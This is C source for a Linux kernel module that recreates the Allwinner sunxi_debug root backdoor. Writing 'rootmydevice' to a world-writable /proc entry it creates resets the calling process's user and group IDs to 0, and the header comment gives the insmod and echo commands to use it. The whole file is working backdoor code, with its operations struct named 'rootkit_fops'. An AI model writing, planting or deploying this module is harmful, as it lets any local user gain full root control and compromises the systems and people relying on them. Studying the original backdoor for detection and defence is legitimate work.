/*
 * Sun.c  (.. For Fun And Profit )
 *
 * Analiz
 *
 * Code ripped from sunxi_debug.c
 *
 *  http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/
 *
 * #insmod sun.ko
 * 
 * echo "rootmydevice" > /proc/sun_debug/sun_debug
 * 
*/


#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_fs.h>
MODULE_DESCRIPTION("Code ripped from sunxi_debug.c //  Analiz // analiz@safe-mail.net");



static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_su;



static int sun_proc_su_write(struct file *file, const char __user *buffer, unsigned long count, void *data);

static const struct file_operations rootkit_fops = {
    .owner      = THIS_MODULE,
    .write      = sun_proc_su_write,
};


static int sun_proc_su_read(char *page, char **start, off_t off, int count, int *eof, void *data)
{
	printk("sun debug: rootmydevice\n");
 	return 0;
}


static int sun_proc_su_write(struct file *file, const char __user *buffer, unsigned long count, void *data)
{
	char *buf;
	struct cred *new;

	if (count < 1)
		return -EINVAL;

	buf = kmalloc(count, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (copy_from_user(buf, buffer, count)) {
		kfree(buf);
		return -EFAULT;
	}

	if(!strncmp("rootmydevice",(char*)buf,12))
{
       new = prepare_creds();
        if (new != NULL) {
          new->uid.val = new -> gid.val = 0;
          new->euid.val = new ->egid.val = 0;
          new->suid.val = new->sgid.val=0;
          new->fsuid.val = new->fsgid.val = 0;
          commit_creds(new);
		printk("now you are root\n");
	}

	kfree(buf);
	return count;
}
}


static int sun_root_procfs_attach(void)
{
	proc_root = proc_mkdir("sun_debug", NULL);
	proc_su= proc_create("sun_debug", 0666,proc_root,&rootkit_fops);


	if (IS_ERR(proc_su))
	{
		printk("create sun_debug dir error\n");
		return -1;
	}
	return 0;
	
}

static int __init sun_debug_init(void)
{
	int ret;
	ret = sun_root_procfs_attach();
	printk("sun_root_procfs_attach\n");
	if(ret){
		printk("sun_root_procfs_attach failed===\n ");
	}
	return ret;
}

//static void __exit sun_backdoor_exit(void)
//{
//    remove_proc_entry("sun", proc_root);
//}



module_init(sun_debug_init);
//module_exit(sun_backdoor_exit);

